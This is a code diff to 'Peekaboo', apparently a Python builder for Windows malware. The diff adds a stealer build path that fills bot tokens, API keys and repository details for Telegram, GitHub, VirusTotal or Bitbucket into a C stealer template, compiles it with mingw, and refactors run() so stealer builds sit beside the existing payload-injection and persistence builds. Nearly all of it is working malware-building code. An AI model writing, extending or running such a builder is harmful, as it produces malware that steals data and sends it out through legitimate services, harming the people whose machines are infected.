@@ -193,7 +193,7 @@ class Peekaboo:
             print(Colors.error(f"compilation error: {e}"))
             return None
 
-    def compile_c(self, source_path: Path, output_path: Path) -> Optional[Path]:
+    def compile_c(self, source_path: Path, output_path: Path, extra_libs: list = None) -> Optional[Path]:
         """compile C source to Windows executable using mingw"""
         try:
             if not self.mingw_path:
@@ -208,7 +208,7 @@ class Peekaboo:
             if not gcc.exists():
                 gcc = self.mingw_path / "x86_64-w64-mingw32-gcc"
 
-            cmd = [str(gcc), *self.compiler_flags, str(src), '-o', str(out)]
+            cmd = [str(gcc), *self.compiler_flags, str(src), '-o', str(out)] + (extra_libs or [])
             print(Colors.info(f"compiling: {' '.join(cmd)}"))
 
             result = subprocess.run(cmd, capture_output=True, text=True)
@@ -616,6 +616,56 @@ class Peekaboo:
         except Exception as e:
             print(Colors.error(f"error building/compiling malware: {e}"))
 
+    def _stealer_substitutions(self) -> dict:
+        cfg_dir = Path(__file__).parent / "config"
+        subs = {}
+        if self.stealer_api == "telegram":
+            cfg = self._load_config(cfg_dir / "telegram_config.json") or {}
+            subs["TELEGRAM_CHAT_ID_PLACEHOLDER"]   = cfg.get("chat_id", "")
+            subs["TELEGRAM_BOT_TOKEN_PLACEHOLDER"] = cfg.get("bot_token", "")
+        elif self.stealer_api == "github":
+            cfg = self._load_config(cfg_dir / "github_config.json") or {}
+            subs["github_classic_token"]           = cfg.get("github_token", "")
+            subs["GITHUB_REPO_OWNER_PLACEHOLDER"]  = cfg.get("repo_owner", "")
+            subs["GITHUB_REPO_NAME_PLACEHOLDER"]   = cfg.get("repo_name", "")
+            subs["GITHUB_ISSUE_NUMBER_PLACEHOLDER"] = cfg.get("issue_number", "1")
+        elif self.stealer_api == "virustotal":
+            cfg = self._load_config(cfg_dir / "virustotal_config.json") or {}
+            subs["VT_API_KEY_PLACEHOLDER"]         = cfg.get("vt_api_key", "")
+            subs["VT_API_FILE_ID_PLACEHOLDER"]     = cfg.get("file_id", "")
+        elif self.stealer_api == "bitbucket":
+            cfg = self._load_config(cfg_dir / "bitbucket_config.json") or {}
+            subs["BITBUCKET_TOKEN_PLACEHOLDER"]     = cfg.get("bitbucket_token_base64", "")
+            subs["BITBUCKET_WORKSPACE_PLACEHOLDER"] = cfg.get("bitbucket_workspace", "")
+            subs["BITBUCKET_REPO_PLACEHOLDER"]      = cfg.get("bitbucket_repo", "")
+        return subs
+
+    def build_and_compile_stealer(self) -> Optional[Path]:
+        try:
+            print(Colors.header(f"building stealer: {self.stealer_api}"))
+            src = self.get_stealer_template(self.stealer_api)
+            if not src:
+                print(Colors.error(f"stealer template not found: {self.stealer_api}"))
+                return None
+
+            subs = self._stealer_substitutions()
+            for placeholder, value in subs.items():
+                src = src.replace(placeholder, value)
+
+            out_dir = self.templates_dir / "stealer" / self.stealer_api
+            out_dir.mkdir(parents=True, exist_ok=True)
+            stealer_c = out_dir / "stealer_final.c"
+            stealer_c.write_text(src, encoding="utf-8")
+            print(Colors.success(f"wrote stealer source: {stealer_c}"))
+
+            stealer_exe = out_dir / "peekaboo.exe"
+            result = self.compile_c(stealer_c, stealer_exe,
+                                    extra_libs=["-lwinhttp", "-liphlpapi"])
+            return result
+        except Exception as e:
+            print(Colors.error(f"error building stealer: {e}"))
+            return None
+
     def build_persistence_binary(self, malware_out_dir: Path) -> Optional[Path]:
         try:
             print(Colors.header(f"building persistence binary: {self.persistence_type}"))
@@ -666,21 +716,26 @@ class Peekaboo:
 
     def run(self) -> None:
         try:
-            deps_ok = self.check_dependencies()
-            encrypted_payload = self.encrypt_payload()
-            if encrypted_payload is None:
-                print(Colors.error("encryption step failed; aborting"))
-                return
-            self.build_and_compile_malware(encrypted_payload)
+            self.check_dependencies()
 
-            malware_exe = self.templates_dir / "injection" / self.injection_type / "peekaboo.exe"
-            persistence_exe = None
+            if self.malware_type == "stealer":
+                malware_exe = self.build_and_compile_stealer()
+                self._print_instructions(malware_exe, None)
+            else:
+                encrypted_payload = self.encrypt_payload()
+                if encrypted_payload is None:
+                    print(Colors.error("encryption step failed; aborting"))
+                    return
+                self.build_and_compile_malware(encrypted_payload)
 
-            if self.persistence_type != "none":
-                malware_out_dir = self.templates_dir / "injection" / self.injection_type
-                persistence_exe = self.build_persistence_binary(malware_out_dir)
+                malware_exe = self.templates_dir / "injection" / self.injection_type / "peekaboo.exe"
+                persistence_exe = None
 
-            self._print_instructions(malware_exe, persistence_exe)
+                if self.persistence_type != "none":
+                    malware_out_dir = self.templates_dir / "injection" / self.injection_type
+                    persistence_exe = self.build_persistence_binary(malware_out_dir)
+
+                self._print_instructions(malware_exe, persistence_exe)
         except Exception as e:
             print(Colors.error(f"fatal error in run(): {e}"))
 
